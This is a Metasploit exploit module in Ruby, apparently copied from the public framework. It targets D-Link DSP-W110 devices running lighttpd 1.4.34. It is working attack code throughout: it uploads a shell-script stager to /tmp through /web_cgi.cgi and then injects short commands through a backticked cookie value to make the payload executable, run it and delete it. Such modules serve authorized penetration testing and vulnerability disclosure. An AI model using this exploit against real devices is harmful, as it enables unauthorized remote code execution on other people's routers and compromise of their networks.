# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;D-Link Cookie Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an anonymous remote upload and code execution vulnerability on different
        D-Link devices. The vulnerability is a command injection in the cookie handling process of the
        lighttpd web server when handling specially crafted cookie values. This module has been
        successfully tested on D-Link DSP-W110A1_FW105B01 in emulated environment.
      },
      &#039;Author&#039;         =>
        [
          &#039;Peter Adkins <peter.adkins[at]kernelpicnic.net>&#039;, # vulnerability discovery and initial PoC
          &#039;Michael Messner <devnull[at]s3cur1ty.de>&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://github.com/darkarnium/secpub/tree/master/D-Link/DSP-W110&#039;] # blog post including PoC
        ],
      &#039;DisclosureDate&#039; => &#039;Jun 12 2015&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039; =>
        [
          [ &#039;MIPS Little Endian&#039;,  # unknown if there are LE devices out there ... but in case we have a target
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039;     => ARCH_MIPSLE
            }
          ],
          [ &#039;MIPS Big Endian&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039;     => ARCH_MIPSBE
            }
          ]
        ],
      &#039;DefaultTarget&#039;    => 1
      ))
  end

  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => &#039;/&#039;,
        &#039;method&#039; => &#039;GET&#039;
      })

      if res && res.headers["Server"] =~ /lighttpd\/1\.4\.34/
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    print_status("#{peer} - Trying to access the device ...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable device")
    end

    print_status("#{peer} - Uploading stager ...")
    @counter = 1
    execute_cmdstager(
      :flavor  => :echo,
      :linemax => 95  # limited by our upload, larger payloads crash the web server
    )

    print_status("#{peer} - creating payload and executing it ...")

    (1 .. @counter).each do |act_file|
      # the http server blocks access to our files ... we copy it to a new one
      # the length of our command is restricted to 19 characters
      cmd = "cp /t*/#{act_file} /tmp/#{act_file+@counter}"
      execute_final_command(cmd)
      cmd = "chmod +x /tmp/#{act_file+@counter}"
      execute_final_command(cmd)
      cmd = "/tmp/#{act_file+@counter}"
      execute_final_command(cmd)
      cmd = "rm /tmp/#{act_file}"
      execute_final_command(cmd)
      cmd = "rm /tmp/#{act_file+@counter}"
      execute_final_command(cmd)
    end
  end

  def execute_command(cmd,opts)
    # upload our stager to a shell script
    # upload takes quite long because there is no response from the web server

    file_upload = "#!/bin/sh\n"
    file_upload << cmd << "\n"

    post_data = Rex::MIME::Message.new
    post_data.add_part(file_upload, nil, "binary", "form-data; name=\"#{rand_text_alpha(4)}\"; filename=\"#{@counter}\"")
    post_data.bound = "-#{rand_text_alpha(12)}--"
    file = post_data.to_s

    @counter = @counter + 1

    begin
      send_request_cgi({
        &#039;method&#039;        => &#039;POST&#039;,
        &#039;uri&#039;           => "/web_cgi.cgi",
        &#039;vars_get&#039; => {
          &#039;&request&#039; =>&#039;UploadFile&#039;,
          &#039;path&#039; => &#039;/tmp/&#039;
        },
        &#039;encode_params&#039; => false,
        &#039;ctype&#039;         => "multipart/form-data; boundary=#{post_data.bound}",
        &#039;data&#039;          => file
      })
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end

  end

  def execute_final_command(cmd)
    # very limited space - larger commands crash the webserver
    fail_with(Failure::Unknown, "#{peer} - Generated command for injection is too long") if cmd.length > 18
    begin
      send_request_cgi({
        &#039;method&#039;        => &#039;GET&#039;,
        &#039;uri&#039;           => "/",
        &#039;cookie&#039;        => "i=`#{cmd}`"
      }, 5)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end

